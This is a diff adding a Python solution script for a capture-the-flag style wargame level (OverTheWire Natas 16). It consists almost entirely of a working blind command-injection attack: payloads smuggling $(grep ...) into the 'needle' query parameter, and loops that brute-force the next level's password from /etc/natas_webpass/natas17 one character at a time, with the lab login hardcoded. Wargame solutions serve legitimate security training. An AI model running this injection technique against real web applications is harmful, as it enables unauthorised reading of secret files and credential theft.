@@ -1,0 +1,40 @@
+'''
+$(grep b /etc/natas_webpass/natas17)doomed
+doomed$(grep a /etc/natas_webpass/natas17)
+$(grep a /etc/natas_webpass/natas17)doomed
+'''
+#!import/bin/python
+import requests
+import string
+
+url = "http://natas16.natas.labs.overthewire.org/"
+
+auth_username = "natas16"
+auth_password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
+
+characters = ''.join([string.ascii_letters, string.digits])
+
+password_dictionary = []
+
+exsits_str = "doomed"
+
+for char in characters:
+    uri = ''.join([url, '?', 'needle=doomed$(grep ', char,' /etc/natas_webpass/natas17)'])
+    r = requests.get(uri, auth=(auth_username, auth_password))
+    if exsits_str not in r.text:
+        password_dictionary.append(char)
+        print(f"Password Dictionary: {password_dictionary}")
+
+#password_dictionary = ['b', 'c', 'd', 'g', 'h', 'k', 'm', 'n', 'q', 'r', 's', 'w', 'A', 'G', 'H', 'N', 'P', 'Q', 'S', 'W', '0', '3', '5', '7', '8', '9']
+
+password_list = []
+password = ''
+for i in range(1,32):
+    for char in password_dictionary:
+        test = ''.join([password,char])
+        uri = ''.join([url,'?','needle=doomed$(grep -E ^',test,' /etc/natas_webpass/natas17)'])
+        r = requests.get(uri,auth=(auth_username,auth_password))
+        if exsits_str not in r.text:
+            password_list.append(char)
+            password = ''.join(password_list)
+            print(f'length:{len(password)} Password:{password}')
